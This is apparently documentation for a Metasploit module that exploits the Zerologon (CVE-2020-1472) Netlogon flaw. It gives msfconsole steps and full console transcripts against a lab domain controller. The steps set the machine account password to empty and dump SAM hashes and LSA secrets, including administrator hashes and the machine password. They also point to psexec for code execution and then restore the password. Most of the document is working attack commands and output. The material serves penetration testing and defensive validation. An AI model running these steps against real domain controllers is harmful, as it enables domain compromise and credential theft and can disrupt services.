## Vulnerable Application
A vulnerability exists within the Netlogon authentication process where the security properties granted by AES are lost
due to an implementation flaw related to the use of a static initialization vector (IV). An attacker can leverage this
flaw to target an Active Directory Domain Controller and make repeated authentication attempts using NULL data fields
which will succeed every 1 in 256 tries (~0.4%). This module leverages the vulnerability to reset the machine account
password to an empty string, which will then allow the attacker to authenticate as the machine account. After
exploitation, it's important to restore this password to it's original value. Failure to do so can result in service
instability.

The `auxiliary/gather/windows_secrets_dump` module can be used to recover the original machine account password which
can then be restored with this module by using the `RESTORE` action and setting the `PASSWORD` value.

## Verification Steps

1. Exploit the vulnerability to remove the machine account password by replacing it with an empty string
    1. From msfconsole
    1. Do: `use auxiliary/admin/dcerpc/cve_2020_1472_zerologon`
    1. Set the `RHOSTS` and `NBNAME` values
    1. Run the module and see that the original machine account password was removed
1. Recover the original machine account password
    1. Do: `use auxiliary/gather/windows_secrets_dump`
    1. Set the `RHOSTS` values
    1. Set the `SMBUser` option to the NetBIOS name with a trailing `$`, e.g. `NBNAME$`
    1. Set the `SMBPass` option to `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0` (the hash of an empty password)
    1. Run the module and search for the password in the output (`NBNAME$:plain_password_hex:`)
1. Restore the original machine account password
    1. From msfconsole
    1. Do: `use auxiliary/admin/dcerpc/cve_2020_1472_zerologon`
    1. Set the action to `RESTORE`
    1. Set the `RHOSTS`, `NBNAME` and `PASSWORD` values
    1. Run the module and see that the original value was restored

## Options

### NBNAME

The NetBIOS name of the target domain controller. You can use the `auxiliary/scanner/netbios/nbname` module to obtain
this value. If this value is invalid the module will fail when making a Netlogon RPC request.

### PASSWORD

The hex value of the original machine account password. This value is typically recovered from the target system's
registry (such as by using the `auxiliary/gather/windows_secrets_dump` Metasploit module) after successfully setting the
value to an empty string within Active Directory using this module and the default `REMOVE` action.

This value is only used when running the module with the `RESTORE` action.

## Scenarios

### Windows Server 2019

First, exploit the vulnerability to remove the machine account password by replacing it with an empty string.

```
msf6 > use auxiliary/admin/dcerpc/cve_2020_1472_zerologon 
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set RHOSTS 192.168.159.53 
RHOSTS => 192.168.159.53
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set NBNAME WIN-GD5KVDKUNIP
NBNAME => WIN-GD5KVDKUNIP
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > show options 

Module options (auxiliary/admin/dcerpc/cve_2020_1472_zerologon):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   NBNAME  WIN-GD5KVDKUNIP  yes       The server's NetBIOS name
   RHOSTS  192.168.159.53   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                    no        The netlogon RPC port (TCP)


Auxiliary action:

   Name    Description
   ----    -----------
   REMOVE  Remove the machine account password


msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > run
[*] Running module against 192.168.159.53

[*] 192.168.159.53: - Connecting to the endpoint mapper service...
[*] 192.168.159.53:6403 - Binding to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.159.53[6403] ...
[*] 192.168.159.53:6403 - Bound to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.159.53[6403] ...
[+] 192.168.159.53:6403 - Successfully authenticated
[+] 192.168.159.53:6403 - Successfully set the machine account (WIN-GD5KVDKUNIP$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)
[*] Auxiliary module execution completed
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) >
```

At this point the `exploit/windows/smb/psexec` module can be used to achieve code execution if desired. Set the `SMBUser` option to the
machine account and the `SMBPass` option to the empty password value.

Next, recover the original machine account password value using `auxiliary/gather/windows_secrets_dump`. Look for the `plain_password_hex`
value in the `$MACHINE.ACC` section.

```
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > use auxiliary/gather/windows_secrets_dump 
msf6 auxiliary(gather/windows_secrets_dump) > set RHOSTS 192.168.159.53
RHOSTS => 192.168.159.53
msf6 auxiliary(gather/windows_secrets_dump) > set SMBUser WIN-GD5KVDKUNIP$
SMBUser => WIN-GD5KVDKUNIP$
msf6 auxiliary(gather/windows_secrets_dump) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
SMBPass => aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 auxiliary(gather/windows_secrets_dump) > run
[*] Running module against 192.168.159.53

[*] 192.168.159.53:445 - Service RemoteRegistry is already running
[*] 192.168.159.53:445 - Retrieving target system bootKey
[+] 192.168.159.53:445 - bootKey: 0xa11f7c33c8bab9e427dec59436dbb17d
[*] 192.168.159.53:445 - Saving remote SAM database
[*] 192.168.159.53:445 - Dumping SAM hashes
[*] 192.168.159.53:445 - Password hints:
No users with password hints on this system
[*] 192.168.159.53:445 - Password hashes (pwdump format - uid:rid:lmhash:nthash:::):
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6df12cddaa88057f06a80b5ee73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d17ae931b73c5ad7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d17ae931b73c5ad7e0c089c0:::
[*] 192.168.159.53:445 - Saving remote SECURITY database
[*] 192.168.159.53:445 - Decrypting LSA Key
[*] 192.168.159.53:445 - Dumping LSA Secrets
$MACHINE.ACC
EXCHG\WIN-GD5KVDKUNIP$:plain_password_hex:4151e8f8490762bc47ec11855921aef606f9d37176aef0f43a3fc6dc4aefc4c0d7bb7b88ad635a11f94de37e0d82495bab1dec25ac9d547910f94332f4598de372c07635fba1f6592bd3bb5aeb827cb088b1cae8db872b59e267ccfef1df40580c8d918befb3c39d809a6c89767a466f88f40eb373f86cf20c9b6a07e89b596e14a44eae6a4ae55b92a481b71452a3bbab2d5735d70868b778541f3c6e4d1c8c097c086bc40d364c01d4520b8a86a217ac79b4e826b9dc2eedd0a834146e3f6fba7422960dbd4051f499be61eca4e1aeba786030acfdd21e9f5a98a35a3f0430cf0b536bff99163118a1c75ec852cc2d
EXCHG\WIN-GD5KVDKUNIP$:aes256-cts-hmac-sha1-96:127c328739d4406e6734684b971709acb2215f947b961355fa25b9b3fda38a08
EXCHG\WIN-GD5KVDKUNIP$:aes128-cts-hmac-sha1-96:becbe21ab050ccb1d8a5b908839fd95f
EXCHG\WIN-GD5KVDKUNIP$:des-cbc-md5:b5f843cec2e56220
EXCHG\WIN-GD5KVDKUNIP$:aad3b435b51404eeaad3b435b51404ee:ec3a7fa2158f1f705898d538ad3aafaf:::
...

[*] 192.168.159.53:445 - Decrypting NL$KM
[*] 192.168.159.53:445 - Dumping cached hashes
No cached hashes on this system
[*] 192.168.159.53:445 - Cleaning up...
[*] Auxiliary module execution completed
msf6 auxiliary(gather/windows_secrets_dump) >
```

Finally, restore the original value using this module.

```
msf6 auxiliary(gather/windows_secrets_dump) > use auxiliary/admin/dcerpc/cve_2020_1472_zerologon 
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set ACTION RESTORE 
ACTION => RESTORE
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > set PASSWORD 4151e8f8490762bc47ec11855921aef606f9d37176aef0f43a3fc6dc4aefc4c0d7bb7b88ad635a11f94de37e0d82495bab1dec25ac9d547910f94332f4598de372c07635fba1f6592bd3bb5aeb827cb088b1cae8db872b59e267ccfef1df40580c8d918befb3c39d809a6c89767a466f88f40eb373f86cf20c9b6a07e89b596e14a44eae6a4ae55b92a481b71452a3bbab2d5735d70868b778541f3c6e4d1c8c097c086bc40d364c01d4520b8a86a217ac79b4e826b9dc2eedd0a834146e3f6fba7422960dbd4051f499be61eca4e1aeba786030acfdd21e9f5a98a35a3f0430cf0b536bff99163118a1c75ec852cc2d
PASSWORD => 4151e8f8490762bc47ec11855921aef606f9d37176aef0f43a3fc6dc4aefc4c0d7bb7b88ad635a11f94de37e0d82495bab1dec25ac9d547910f94332f4598de372c07635fba1f6592bd3bb5aeb827cb088b1cae8db872b59e267ccfef1df40580c8d918befb3c39d809a6c89767a466f88f40eb373f86cf20c9b6a07e89b596e14a44eae6a4ae55b92a481b71452a3bbab2d5735d70868b778541f3c6e4d1c8c097c086bc40d364c01d4520b8a86a217ac79b4e826b9dc2eedd0a834146e3f6fba7422960dbd4051f499be61eca4e1aeba786030acfdd21e9f5a98a35a3f0430cf0b536bff99163118a1c75ec852cc2d
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > show options 

Module options (auxiliary/admin/dcerpc/cve_2020_1472_zerologon):

   Name      Current Setting                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   Required  Description
   ----      ---------------                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   --------  -----------
   NBNAME    WIN-GD5KVDKUNIP                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   yes       The server's NetBIOS name
   PASSWORD  4151e8f8490762bc47ec11855921aef606f9d37176aef0f43a3fc6dc4aefc4c0d7bb7b88ad635a11f94de37e0d82495bab1dec25ac9d547910f94332f4598de372c07635fba1f6592bd3bb5aeb827cb088b1cae8db872b59e267ccfef1df40580c8d918befb3c39d809a6c89767a466f88f40eb373f86cf20c9b6a07e89b596e14a44eae6a4ae55b92a481b71452a3bbab2d5735d70868b778541f3c6e4d1c8c097c086bc40d364c01d4520b8a86a217ac79b4e826b9dc2eedd0a834146e3f6fba7422960dbd4051f499be61eca4e1aeba786030acfdd21e9f5a98a35a3f0430cf0b536bff99163118a1c75ec852cc2d  no        The password to restore for the machine account (in hex)
   RHOSTS    192.168.159.53                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       no        The netlogon RPC port (TCP)


Auxiliary action:

   Name     Description
   ----     -----------
   RESTORE  Restore the machine account password


msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > run
[*] Running module against 192.168.159.53

[*] 192.168.159.53: - Connecting to the endpoint mapper service...
[*] 192.168.159.53:6403 - Binding to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.159.53[6403] ...
[*] 192.168.159.53:6403 - Bound to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.159.53[6403] ...
[+] 192.168.159.53:6403 - Successfully set machine account (WIN-GD5KVDKUNIP$) password
[*] Auxiliary module execution completed
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) >
```
